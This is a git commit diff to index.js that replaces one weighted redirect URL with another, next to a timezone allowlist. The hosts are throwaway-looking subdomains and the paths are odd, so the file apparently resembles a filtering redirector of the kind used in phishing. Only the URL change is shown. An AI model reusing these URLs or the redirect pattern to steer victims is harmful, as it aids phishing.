f907a709f45819769da9cf6dd89fcc9ccd4c416a
paalakash <palaksh452@gmail.com>
2026-07-06 04:42:17 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://hdsukghvudgd.on-forge.com/werrx01USAHTML/?bcda", weight: 1.0 }
+    { url: "https://shark-app-4glai.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
 
 ];
 
